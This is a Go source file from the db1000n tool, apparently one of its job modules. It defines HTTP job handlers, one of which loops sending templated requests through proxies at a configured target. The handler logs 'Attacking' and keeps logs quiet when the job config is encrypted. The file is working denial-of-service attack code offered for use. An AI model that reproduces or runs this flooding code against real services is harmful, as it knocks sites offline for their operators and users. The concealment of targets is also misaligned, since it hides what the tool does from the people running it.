package jobs

import (
	"context"
	"log"
	"time"

	"github.com/google/uuid"
	"github.com/valyala/fasthttp"

	"github.com/Arriven/db1000n/src/core/http"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
	"github.com/Arriven/db1000n/src/utils/templates"
)

type httpJobConfig struct {
	BasicJobConfig

	Request map[string]interface{}
	Client  map[string]interface{} // See HTTPClientConfig
}

func singleRequestJob(ctx context.Context, globalConfig GlobalConfig, args Args) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	defer utils.PanicHandler()

	var jobConfig httpJobConfig
	if err := utils.Decode(args, &jobConfig); err != nil {
		if !isInEncryptedContext(ctx) {
			log.Printf("Error parsing job config: %v", err)
		}

		return nil, err
	}

	var clientConfig http.ClientConfig
	if err := utils.Decode(templates.ParseAndExecuteMapStruct(jobConfig.Client, ctx), &clientConfig); err != nil {
		if !isInEncryptedContext(ctx) {
			log.Printf("Error parsing client config: %v", err)
		}

		return nil, err
	}

	if globalConfig.ProxyURL != "" {
		clientConfig.ProxyURLs = globalConfig.ProxyURL
	}

	client := http.NewClient(clientConfig, globalConfig.Debug)

	var requestConfig http.RequestConfig
	if err := utils.Decode(templates.ParseAndExecuteMapStruct(jobConfig.Request, ctx), &requestConfig); err != nil {
		if !isInEncryptedContext(ctx) {
			log.Printf("Error parsing request config: %v", err)
		}

		return nil, err
	}

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseResponse(resp)

	if !isInEncryptedContext(ctx) {
		log.Printf("Sent single http request to %v", requestConfig.Path)
	}

	dataSize := http.InitRequest(requestConfig, req)

	metrics.Default.Write(metrics.Traffic, uuid.New().String(), uint64(dataSize))

	if err = sendFastHTTPRequest(client, req, resp); err == nil {
		metrics.Default.Write(metrics.ProcessedTraffic, uuid.New().String(), uint64(dataSize))
	}

	headers, cookies := make(map[string]string), make(map[string]string)

	resp.Header.VisitAll(func(key []byte, value []byte) {
		headers[string(key)] = string(value)
	})

	resp.Header.VisitAllCookie(func(key []byte, value []byte) {
		c := fasthttp.AcquireCookie()
		defer fasthttp.ReleaseCookie(c)

		if err := c.ParseBytes(value); err != nil {
			return
		}

		if expire := c.Expire(); expire != fasthttp.CookieExpireUnlimited && expire.Before(time.Now()) {
			if globalConfig.Debug && !isInEncryptedContext(ctx) {
				log.Println("cookie from request expired:", string(key))
			}

			return
		}
		cookies[string(key)] = string(c.Value())
	})

	return map[string]interface{}{
		"response": map[string]interface{}{
			"body":        string(resp.Body()),
			"status_code": resp.StatusCode(),
			"headers":     headers,
			"cookies":     cookies,
		},
		"error": err,
	}, nil
}

func fastHTTPJob(ctx context.Context, globalConfig GlobalConfig, args Args) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	defer utils.PanicHandler()

	var jobConfig httpJobConfig
	if err := utils.Decode(args, &jobConfig); err != nil {
		if !isInEncryptedContext(ctx) {
			log.Printf("Error parsing job config: %v", err)
		}

		return nil, err
	}

	var clientConfig http.ClientConfig
	if err := utils.Decode(templates.ParseAndExecuteMapStruct(jobConfig.Client, ctx), &clientConfig); err != nil {
		if !isInEncryptedContext(ctx) {
			log.Printf("Error parsing client config: %v", err)
		}

		return nil, err
	}

	if globalConfig.ProxyURL != "" {
		clientConfig.ProxyURLs = globalConfig.ProxyURL
	}

	client := http.NewClient(clientConfig, globalConfig.Debug)

	requestTpl, err := templates.ParseMapStruct(jobConfig.Request)
	if err != nil {
		if !isInEncryptedContext(ctx) {
			log.Printf("Error parsing request config: %v", err)
		}

		return nil, err
	}

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)

	processedTrafficMonitor := metrics.Default.NewWriter(metrics.ProcessedTraffic, uuid.NewString())
	go processedTrafficMonitor.Update(ctx, time.Second)

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	if !isInEncryptedContext(ctx) {
		log.Printf("Attacking %v", jobConfig.Request["path"])
	}

	for jobConfig.Next(ctx) {
		var requestConfig http.RequestConfig
		if err := utils.Decode(requestTpl.Execute(ctx), &requestConfig); err != nil {
			if !isInEncryptedContext(ctx) {
				log.Printf("Error executing request template: %v", err)
			}

			return nil, err
		}

		dataSize := http.InitRequest(requestConfig, req)

		trafficMonitor.Add(uint64(dataSize))

		if err := sendFastHTTPRequest(client, req, nil); err != nil {
			if globalConfig.Debug && !isInEncryptedContext(ctx) {
				log.Printf("Error sending request %v: %v", req, err)
			}
		} else {
			processedTrafficMonitor.Add(uint64(dataSize))
		}
	}

	return nil, nil
}

func sendFastHTTPRequest(client *fasthttp.Client, req *fasthttp.Request, resp *fasthttp.Response) error {
	if err := client.Do(req, resp); err != nil {
		metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusFail)

		return err
	}

	metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusSuccess)

	return nil
}
